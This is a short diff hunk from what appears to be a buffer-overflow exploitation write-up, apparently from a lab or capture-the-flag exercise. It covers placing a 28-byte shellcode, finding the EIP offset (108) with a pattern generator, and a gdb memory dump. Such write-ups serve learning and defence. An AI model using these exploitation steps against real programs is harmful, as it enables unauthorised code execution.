@@ -159,4 +159,8 @@ What does it mean:
 	 804807a: cd 80                 int    $0x80	;restart_syscall()
 
 Shellcode length is 28 bytes that is very important because we need to count where to put it so that it is executed and does not break the programm.
-We count where to put the shellcode while counting `EIP` offset. This we can do with the help of special strings: https://wiremask.eu/tools/buffer-overflow-pattern-generator/. We get address 0x41366441 that means that
+We count where to put the shellcode while counting `EIP` offset. This we can do with the help of special strings: https://wiremask.eu/tools/buffer-overflow-pattern-generator/. We get address 0x41366441 that means that offset is 108:
+
+	Breakpoint 6, 0x08048677 in main ()
+	(gdb) x/50wx $ebp+0xc
+		0xbffff644:	0xbffff6d4	0xbffff6e0
